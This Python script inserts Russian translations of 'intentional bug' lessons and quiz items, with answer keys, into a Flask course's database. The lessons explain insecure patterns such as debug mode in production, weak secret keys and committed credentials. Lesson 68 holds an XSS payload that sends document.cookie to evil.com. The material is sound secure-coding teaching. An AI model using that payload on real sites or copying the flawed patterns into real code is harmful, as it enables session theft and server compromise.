"""Russian translations for the enhance_course_21_flask.py content additions."""
from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # noqa: E402
sys.path.insert(0, str(Path(__file__).resolve().parent))  # noqa: E402

from sqlalchemy import select  # noqa: E402

from app.db.database import AsyncSessionLocal  # noqa: E402
from app.db import base as _base  # noqa: E402,F401
from app.models.lesson import Lesson  # noqa: E402
from app.models.exercise import Exercise  # noqa: E402
from app.models.translation_cache import TranslationCache  # noqa: E402
from write_ru_translations import _write  # noqa: E402

MARKER_RU = "🐛 Намеренная ошибка"

BUG_HTML_RU = {
    66: f"""<h3>{MARKER_RU}</h3>
<p>Ученик деплоит проект на сервер, не меняя код:</p>
<pre><code class="lang-python">if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')</code></pre>
<p><strong>Результат:</strong> это <strong>серьёзная дыра в безопасности</strong> в продакшене. При <code>debug=True</code>, если возникает ошибка, Flask показывает в браузере интерактивный отладчик Werkzeug — через него любой пользователь может <strong>выполнить произвольный Python-код</strong> на сервере (Remote Code Execution).</p>
<p><strong>Правильное решение:</strong> <code>debug=True</code> используется только локально при разработке. В продакшене <code>FLASK_DEBUG=0</code> (или вообще не указывается), а сам сервер запускается через Gunicorn/uWSGI.</p>""",
    67: f"""<h3>{MARKER_RU}</h3>
<p>Ученик регистрирует два маршрута в таком порядке:</p>
<pre><code class="lang-python">@app.route('/user/&lt;string:username&gt;')
def profil(username):
    return f"Profil: {{username}}"

@app.route('/user/new')
def yangi_foydalanuvchi():
    return "Создание нового пользователя"</code></pre>
<p><strong>Результат:</strong> при переходе на <code>/user/new</code> может выводиться ожидаемое "Создание нового пользователя", <strong>но</strong> первый маршрут с <code>&lt;string:username&gt;</code> "перехватывает" слово "new" как username, и второй маршрут <strong>никогда не выполняется</strong> — потому что Flask проверяет маршруты в порядке регистрации и использует первое совпадение.</p>
<p><strong>Правильное решение:</strong> <strong>статичные маршруты всегда регистрируются раньше динамических</strong>: сначала <code>/user/new</code>, затем <code>/user/&lt;string:username&gt;</code>.</p>""",
    68: f"""<h3>{MARKER_RU}</h3>
<p>Ученик добавляет фильтр <code>| safe</code>, чтобы "красиво" показать комментарий пользователя:</p>
<pre><code class="lang-python">&lt;p&gt;{{{{ foydalanuvchi_izohi | safe }}}}&lt;/p&gt;</code></pre>
<p>Пользователь оставляет такой комментарий: <code>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</code></p>
<p><strong>Результат:</strong> Jinja2 по умолчанию автоматически <strong>экранирует</strong> все значения <code>{{{{ }}}}</code> (<code>&lt;script&gt;</code> превращается в текст <code>&amp;lt;script&amp;gt;</code>, не выполняется). Но <code>| safe</code> <strong>отключает</strong> эту защиту — теперь тег <code>&lt;script&gt;</code> из комментария пользователя <strong>реально выполняется как JavaScript</strong> (XSS-атака), может украсть cookie других пользователей.</p>
<p><strong>Правильное решение:</strong> используйте <code>| safe</code> только для HTML, который создали <strong>вы сами</strong> и которому доверяете, никогда — для введённого пользователем текста.</p>""",
    69: f"""<h3>{MARKER_RU}</h3>
<p>Ученик пишет форму входа так:</p>
<pre><code class="lang-html">&lt;form action="/login" method="GET"&gt;
  &lt;input type="text" name="username"&gt;
  &lt;input type="password" name="password"&gt;
  &lt;button type="submit"&gt;Войти&lt;/button&gt;
&lt;/form&gt;</code></pre>
<p><strong>Результат:</strong> после отправки формы URL выглядит так: <code>/login?username=ali&amp;password=секрет123</code>. Пароль остаётся в <strong>истории браузера</strong>, <strong>логах сервера</strong> и <strong>логах прокси/CDN</strong> в открытом виде! Это серьёзная ошибка безопасности для конфиденциальных данных.</p>
<p><strong>Правильное решение:</strong> формы, отправляющие пароли и токены, должны <strong>всегда</strong> использовать <code>method="POST"</code> — данные POST-запроса передаются в теле запроса и не попадают в URL (а значит, и в логи).</p>""",
    71: f"""<h3>{MARKER_RU}</h3>
<p>Ученик, чтобы быстрее запустить проект, пишет так:</p>
<pre><code class="lang-python">app.secret_key = "123"
# или вообще не задаёт — Flask выдаёт ошибку, но некоторые ставят что-то простое вроде "test"</code></pre>
<p><strong>Результат:</strong> сессии Flask <strong>не шифруются</strong> — они лишь <strong>подписываются</strong> с помощью <code>secret_key</code> (Base64 + HMAC-подпись). Любой может открыть session cookie (декодировать Base64) и увидеть содержимое, например <code>{{'user_id': 5, 'is_admin': False}}</code>! Если <code>secret_key</code> простой/угадываемый вроде "123", злоумышленник может <strong>подделать</strong> подпись, изменив <code>is_admin</code> на <code>True</code> — и таким образом получить права администратора.</p>
<p><strong>Правильное решение:</strong> <code>secret_key</code> должен быть длинным, случайным (сгенерированным через <code>secrets.token_hex(32)</code>) и передаваться через <strong>переменную окружения</strong>, а не быть захардкожен в коде.</p>""",
    72: f"""<h3>{MARKER_RU}</h3>
<p>Ученик создаёт новый engine в каждом запросе:</p>
<pre><code class="lang-python">@app.route('/users')
def foydalanuvchilar():
    engine = create_engine(DATABASE_URL)   # КАЖДЫЙ РАЗ новый engine!
    session = sessionmaker(bind=engine)()
    users = session.query(User).all()
    return render_template('users.html', users=users)
    # session.close() не вызван!</code></pre>
<p><strong>Результат:</strong> каждый запрос открывает <strong>новый пул соединений</strong> с базой данных и никогда его не закрывает. Через несколько десятков запросов PostgreSQL выдаёт ошибку <code>"too many connections"</code> — сайт полностью перестаёт работать, хотя в самом коде "ошибки" не видно (при локальном тестировании с одним запросом всё выглядит рабочим).</p>
<p><strong>Правильное решение:</strong> engine создаётся <strong>один раз</strong>, при старте приложения (глобально или внутри app factory) и переиспользуется; каждая сессия <strong>обязательно</strong> закрывается через <code>try/finally</code> или <code>teardown_appcontext</code> Flask.</p>""",
    74: f"""<h3>{MARKER_RU}</h3>
<p>Ученик связывает файлы blueprint и моделей так:</p>
<pre><code class="lang-python"># routes/users.py
from app import db          # импорт db из app.py
from models import User

# app.py
from routes.users import users_bp   # импорт blueprint из routes/users.py
db = SQLAlchemy(app)</code></pre>
<p><strong>Результат:</strong> <code>ImportError: cannot import name 'db' from partially initialized module 'app' (most likely due to a circular import)</code>. Причина: запуск <code>app.py</code> импортирует <code>routes/users.py</code>, который пытается импортировать <code>db</code> обратно из <code>app.py</code> — но <code>app.py</code> ещё <strong>не выполнился полностью</strong> (переменная db ещё не создана), поэтому импорт завершается ошибкой.</p>
<p><strong>Правильное решение:</strong> использовать <strong>паттерн app factory</strong> — создавать <code>db = SQLAlchemy()</code> отдельно в файле <code>extensions.py</code> (без app), а затем связывать через <code>db.init_app(app)</code> внутри <code>create_app()</code>. Это полностью устраняет цикл.</p>""",
    76: f"""<h3>{MARKER_RU}</h3>
<p>Ученик перед загрузкой проекта на GitHub оставляет такой код:</p>
<pre><code class="lang-python"># config.py
SECRET_KEY = "мой-секретный-ключ-2024"
DATABASE_URL = "postgresql://admin:пароль123@db.example.com/mydb"</code></pre>
<pre><code class="lang-bash">git add .
git commit -m "Готово к деплою"
git push origin main</code></pre>
<p><strong>Результат:</strong> секретный ключ и пароль базы данных загружаются на GitHub <strong>в открытом виде</strong>. Если репозиторий публичный — сразу видно всем; даже если приватный, боты (постоянно сканирующие GitHub сервисы) и будущие сотрудники могут это увидеть. Удалить из истории git <strong>не так просто</strong> — данные остаются в истории коммитов, обычного <code>git rm</code> недостаточно.</p>
<p><strong>Правильное решение:</strong> секретные значения <strong>никогда</strong> не пишутся в коде — используется <code>.env</code>-файл (добавленный в <code>.gitignore</code>) или переменные окружения сервера, в коде — только чтение через <code>os.environ["SECRET_KEY"]</code>.</p>""",
}

NEW_EXERCISES_RU = {
    66: {
        "uz_title": "app.run(debug=True) production serverda qoldirilsa, nima uchun bu xavfli?",
        "title": "Почему опасно оставлять app.run(debug=True) на продакшен-сервере?",
        "description": "Проект развёрнут на продакшен-сервере с debug=True. Почему это серьёзная проблема безопасности?",
        "options": '["Страница загружается медленнее", "Через интерактивный отладчик Werkzeug посторонний может выполнить произвольный код на сервере", "CSS-стили работают неправильно", "Debug-режим влияет только на тесты"]',
        "correct_answers": "B",
        "hint": "Что показывается в браузере при ошибке, если включён debug=True?",
        "explanation": "debug=True при ошибке открывает интерактивную консоль отладки Werkzeug — через неё можно выполнить произвольный Python-код в окружении сервера (RCE). Это серьёзный риск для продакшена.",
    },
    67: {
        "uz_title": "Nega /user/new manziliga /user/<string:username> route'i to'sqinlik qilishi mumkin?",
        "title": "Почему маршрут /user/<string:username> может 'перехватывать' /user/new?",
        "description": "Маршрут /user/<string:username> зарегистрирован РАНЬШЕ /user/new. Почему это может быть проблемой?",
        "expected_answer": "Flask проверяет URL в порядке регистрации маршрутов и использует первое совпадение. Если динамический маршрут (<string:username>) идёт раньше статичного (/user/new), он 'перехватывает' слово 'new' как username, и статичный маршрут никогда не срабатывает. Решение: всегда регистрировать статичные маршруты первыми.",
        "hint": "В каком порядке Flask проверяет маршруты — по порядку регистрации или по точности совпадения?",
        "explanation": "Flask (маршрутизация Werkzeug) проверяет запросы в порядке регистрации, а не автоматически выбирает самое точное совпадение. Поэтому статичные маршруты всегда должны идти раньше динамических.",
    },
    68: {
        "uz_title": "{{ izoh | safe }} yozilsa va foydalanuvchi <script> yozsa, nima bo'ladi?",
        "title": "Что произойдёт, если написать {{ комментарий | safe }} и пользователь введёт <script>?",
        "description": "В шаблоне используется {{ foydalanuvchi_izohi | safe }}. Пользователь вводит в поле комментария код &lt;script&gt;...&lt;/script&gt;. Почему это опасно?",
        "options": '["Ничего, Jinja2 всё равно защищает автоматически", "| safe отключает автоматическое экранирование Jinja2, тег script реально выполняется как JS (XSS)", "Фильтр safe работает только для CSS", "Эта ошибка перехватывается на стороне сервера и блокируется"]',
        "correct_answers": "B",
        "hint": "Jinja2 по умолчанию автоматически преобразует спецсимволы. Как на это влияет | safe?",
        "explanation": "При включённом autoescape Jinja2 превращает символы &lt;, &gt; в HTML-сущности, поэтому теги выводятся как текст. Фильтр | safe полностью это отключает — любой введённый пользователем HTML/JS вставляется в страницу как есть, это классическая уязвимость XSS.",
    },
    69: {
        "uz_title": "Login formasi method=\"GET\" bilan yuborilsa, nima uchun bu xavfli?",
        "title": "Почему опасно отправлять форму логина с method=\"GET\"?",
        "description": "В &lt;form action=\"/login\" method=\"GET\"&gt; есть поле password. Как будет выглядеть URL после отправки формы, и почему это проблема?",
        "expected_answer": "При GET-запросе все значения формы передаются в query string URL: /login?username=ali&password=123. Это приводит к тому, что пароль сохраняется в истории браузера, логах сервера и прокси в открытом виде. Решение: формы с конфиденциальными данными всегда должны использовать method=\"POST\".",
        "hint": "Куда попадают данные формы при GET-запросе — в URL или в тело запроса?",
        "explanation": "GET-запросы передают все параметры прямо в URL. Этот URL сохраняется в истории браузера, access-логах сервера и логах промежуточных прокси — недопустимый риск для конфиденциальных данных вроде пароля.",
    },
    71: {
        "uz_title": "secret_key = \"123\" bo'lsa, nega session ma'lumotini qalbakilashtirish mumkin?",
        "title": "Почему при secret_key = \"123\" можно подделать данные сессии?",
        "description": "В Flask-приложении используется app.secret_key = \"123\". Почему это может позволить пользователю выдать себя за администратора?",
        "options": '["Flask автоматически шифрует данные сессии, secret_key нужен только для производительности", "Сессия не шифруется, а только подписывается — слабый ключ позволяет подделать подпись и изменить значение is_admin", "secret_key используется только для CSRF-защиты", "Проблема возникает только без HTTPS"]',
        "correct_answers": "B",
        "hint": "Сессия Flask шифруется или только подписывается? Вспомните разницу.",
        "explanation": "Cookie сессии Flask защищены Base64 + HMAC-подписью, но САМИ ДАННЫЕ не зашифрованы — их может прочитать кто угодно. При слабом secret_key злоумышленник может вычислить правильную подпись и выдать изменённые данные (например is_admin:True) за легитимные.",
    },
    72: {
        "uz_title": "Har bir view funksiyasida yangi create_engine() chaqirilsa, nima uchun sayt oxir-oqibat ishlamay qoladi?",
        "title": "Почему сайт в итоге перестаёт работать, если create_engine() вызывается в каждой view-функции?",
        "description": "В маршруте /users каждый раз вызывается create_engine(DATABASE_URL), а session.close() никогда не вызывается. Что произойдёт при росте трафика?",
        "expected_answer": "Каждый запрос открывает новый пул соединений и не закрывает его, соединения накапливаются. По достижении лимита PostgreSQL появляется ошибка 'too many connections', сайт полностью перестаёт отвечать. Решение: создавать engine один раз при старте приложения и закрывать каждую сессию через try/finally или teardown_appcontext.",
        "hint": "Сколько новых соединений с базой данных открывает каждый HTTP-запрос, и когда они закрываются?",
        "explanation": "create_engine() при каждом вызове создаёт новый пул соединений. Если сессия не закрывается, соединения 'зависают' (утечка). Со временем это упирается в лимит max_connections PostgreSQL и полностью выводит приложение из строя.",
    },
    74: {
        "uz_title": "app.py va routes/users.py bir-biridan import qilsa, nega ImportError chiqadi?",
        "title": "Почему возникает ImportError, если app.py и routes/users.py импортируют друг друга?",
        "description": "routes/users.py импортирует 'db' из app.py. app.py импортирует blueprint из routes/users.py. При запуске появляется ошибка 'cannot import name db from partially initialized module'. Почему?",
        "options": '["Переменная db названа неправильно", "app.py ещё не выполнился полностью (db не создан), когда routes/users.py пытается импортировать db обратно — циклический импорт", "Несовместимая версия SQLAlchemy", "Blueprint нельзя импортировать"]',
        "correct_answers": "B",
        "hint": "Python выполняет файлы сверху вниз. На какой строке app.py останавливается, переходя к routes/users.py?",
        "explanation": "При импорте routes/users.py из app.py запускается его выполнение, и он просит db обратно из app.py — но app.py ещё не дошёл до строки db = SQLAlchemy(app) (он остановился именно на этой строке импорта). Результат: ошибка 'partially initialized module'. Паттерн app factory разрывает этот цикл зависимостей.",
    },
    76: {
        "uz_title": "SECRET_KEY va DATABASE_URL config.py ichiga yozib GitHub'ga push qilinsa, nima uchun bu xavfli?",
        "title": "Почему опасно писать SECRET_KEY и DATABASE_URL в config.py и пушить на GitHub?",
        "description": "В config.py в открытом виде записаны SECRET_KEY и DATABASE_URL с паролем, файл загружен на GitHub через git. Почему это серьёзная проблема безопасности, и достаточно ли исправить это простым git rm?",
        "expected_answer": "Секретные данные остаются в открытом виде в истории репозитория — даже если их потом удалить, они сохраняются в старых коммитах, и обычного git rm недостаточно (нужно чистить всю историю, например через git filter-repo). Кроме того, необходимо немедленно сменить (ротировать) пароль/ключ. Правильный подход: с самого начала хранить секреты в .env-файле и добавить его в .gitignore, в коде читать только через os.environ.",
        "hint": "Как работает история git — исчезает ли закоммиченное значение полностью при простом удалении?",
        "explanation": "Git хранит полную историю. Даже если секретные данные удалить из HEAD, они остаются в старых коммитах. После утечки ключ обязательно нужно ротировать (заменить), так как он уже считается скомпрометированным.",
    },
}


async def main() -> None:
    async with AsyncSessionLocal() as db:
        for lesson_id, bug_html_ru in BUG_HTML_RU.items():
            lesson = (await db.execute(select(Lesson).where(Lesson.id == lesson_id))).scalar_one()

            old_ru_text = (await db.execute(select(TranslationCache).where(
                TranslationCache.entity_type == "lesson", TranslationCache.entity_id == lesson_id,
                TranslationCache.lang == "ru", TranslationCache.field_name == "text_content",
            ))).scalar_one().translated_text
            old_ru_sections = (await db.execute(select(TranslationCache).where(
                TranslationCache.entity_type == "lesson", TranslationCache.entity_id == lesson_id,
                TranslationCache.lang == "ru", TranslationCache.field_name == "sections_json",
            ))).scalar_one().translated_text

            new_ru_text = old_ru_text + "\n\n" + bug_html_ru
            await _write(db, "lesson", lesson_id, "text_content", lesson.text_content, new_ru_text)

            ru_tree = json.loads(old_ru_sections)
            uz_tree = json.loads(lesson.sections_json)
            uz_text_sections = [s for s in uz_tree if s["type"] == "text"]
            ru_text_sections = [s for s in ru_tree if s["type"] == "text"]
            assert len(uz_text_sections) == len(ru_text_sections)
            ru_text_sections[-1]["html"] = (ru_text_sections[-1].get("html") or "") + "\n\n" + bug_html_ru

            uz_exercise_section = next(s for s in uz_tree if s["type"] == "exercise")
            ru_exercise_section = next(s for s in ru_tree if s["type"] == "exercise")
            spec = NEW_EXERCISES_RU[lesson_id]
            uz_ex_dict = next(e for e in uz_exercise_section["exercises"] if e["title"] == spec["uz_title"])
            ex_id = uz_ex_dict["id"]
            ru_ex_dict = dict(uz_ex_dict)
            ru_ex_dict["title"] = spec["title"]
            ru_ex_dict["description"] = spec["description"]
            ru_ex_dict["hint"] = spec["hint"]
            ru_ex_dict["explanation"] = spec.get("explanation", "")
            if "expected_answer" in spec:
                ru_ex_dict["expected_answer"] = spec["expected_answer"]
            ru_exercise_section["exercises"].append(ru_ex_dict)

            new_ru_sections_json = json.dumps(ru_tree, ensure_ascii=False)
            await _write(db, "lesson", lesson_id, "sections_json", lesson.sections_json, new_ru_sections_json)

            ex = (await db.execute(select(Exercise).where(Exercise.id == ex_id))).scalar_one()
            await _write(db, "exercise", ex_id, "title", ex.title, spec["title"])
            await _write(db, "exercise", ex_id, "description", ex.description, spec["description"])
            await _write(db, "exercise", ex_id, "hint", ex.hint or "", spec["hint"])
            await _write(db, "exercise", ex_id, "explanation", ex.explanation or "", spec.get("explanation", ""))
            if ex.expected_answer:
                await _write(db, "exercise", ex_id, "expected_answer", ex.expected_answer, spec.get("expected_answer", ""))

            print(f"lesson {lesson_id}: RU translation written (exercise {ex_id})")

        await db.commit()
        print("\nDone.")


if __name__ == "__main__":
    asyncio.run(main())
